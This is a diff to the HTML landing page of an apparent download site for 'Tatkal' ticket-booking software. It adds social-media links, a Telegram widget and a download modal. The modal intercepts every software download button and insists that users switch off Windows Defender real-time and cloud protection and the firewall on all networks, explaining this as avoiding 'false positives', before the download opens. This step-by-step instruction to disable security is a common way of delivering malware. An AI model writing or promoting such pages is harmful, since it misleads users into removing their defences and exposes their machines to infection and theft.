@@ -23,6 +23,11 @@
         <h1>Premium Tatkal Software</h1>
         <p>Secure, Fast, and Reliable Downloads for All Your Needs</p>
         <a href="#software" class="btn" style="width: auto; padding: 1rem 3rem;">Browse Software</a>
+        
+        <!-- Telegram Widget -->
+        <div style="margin-top: 2rem; max-width: 600px; margin-left: auto; margin-right: auto;">
+            <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-post="tqhub/1501" data-width="100%"></script>
+        </div>
     </section>
 
     <div class="container">
@@ -114,6 +119,47 @@
             </div>
         </div>
 
+        <!-- Social & News Section -->
+        <div class="social-news" id="community">
+            <h2 class="section-title" style="border-color: #ff0055;">Community & Updates</h2>
+            <div class="social-grid">
+                <!-- Telegram -->
+                <div class="social-card telegram">
+                    <div class="social-icon"><i class="fab fa-telegram-plane"></i></div>
+                    <h3>Telegram Channel</h3>
+                    <p>Join for instant updates and support.</p>
+                    <a href="https://t.me/tqhub" target="_blank" class="btn social-btn">Join Now</a>
+                </div>
+                
+                <!-- WhatsApp -->
+                <div class="social-card whatsapp">
+                    <div class="social-icon"><i class="fab fa-whatsapp"></i></div>
+                    <h3>WhatsApp Channel</h3>
+                    <p>Get latest news directly on WhatsApp.</p>
+                    <a href="https://whatsapp.com/channel/0029Van4sE30bIdqSzZenu2E" target="_blank" class="btn social-btn">Join Channel</a>
+                </div>
+
+                <!-- Recent News -->
+                <div class="social-card news">
+                    <div class="social-icon"><i class="fas fa-newspaper"></i></div>
+                    <h3>Recent News</h3>
+                    <p>New update for GADAR v2.0 released! improved stability.</p>
+                    <a href="https://tatkalhub.tawk.help/" target="_blank" class="btn social-btn">Read More</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Video Guides Section -->
+        <div class="video-guides" id="guides">
+            <h2 class="section-title" style="border-color: #ffcc00;">Installation Guides</h2>
+            <div class="coming-soon">
+                <i class="fas fa-video"></i>
+                <h3>Video Tutorials Coming Soon</h3>
+                <p>Step-by-step installation guides are being prepared.</p>
+                <div class="loading-bar"><div class="bar-fill"></div></div>
+            </div>
+        </div>
+
     </div>
 
     <!-- Footer -->
@@ -144,6 +190,72 @@
         }
         setInterval(updateIndianClock, 1000);
         updateIndianClock();
+    </script>
+
+    <!-- Download Instructions Modal -->
+    <div class="modal-overlay" id="downloadModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h2>Action Required</h2>
+            </div>
+            <div class="modal-body">
+                <p>Before downloading, you <strong>MUST</strong> turn off Windows Defender and Firewall to prevent false positives.</p>
+                <div class="steps-container">
+                    <div class="step">
+                        <span class="step-num">1</span>
+                        <p>Go to <strong>Windows Security</strong> > <strong>Virus & threat protection</strong> > <strong>Manage settings</strong>.</p>
+                    </div>
+                    <div class="step">
+                        <span class="step-num">2</span>
+                        <p>Turn <strong>OFF</strong> "Real-time protection" and "Cloud-delivered protection".</p>
+                    </div>
+                    <div class="step">
+                        <span class="step-num">3</span>
+                        <p>Go to <strong>Firewall & network protection</strong> and turn <strong>OFF</strong> Firewall for Domain, Private, and Public networks.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
+                <button class="btn btn-primary" id="acceptDownloadBtn">I Accept & Download</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Script -->
+    <script>
+        const modal = document.getElementById('downloadModal');
+        const acceptBtn = document.getElementById('acceptDownloadBtn');
+        let pendingUrl = '';
+
+        // Add event listeners to all software download buttons
+        document.querySelectorAll('.software-grid .card .btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                pendingUrl = this.getAttribute('href');
+                modal.classList.add('active');
+            });
+        });
+
+        function closeModal() {
+            modal.classList.remove('active');
+            pendingUrl = '';
+        }
+
+        acceptBtn.addEventListener('click', function() {
+            if (pendingUrl) {
+                window.open(pendingUrl, '_blank');
+                closeModal();
+            }
+        });
+
+        // Close modal when clicking outside
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                closeModal();
+            }
+        });
     </script>
 
 </body>
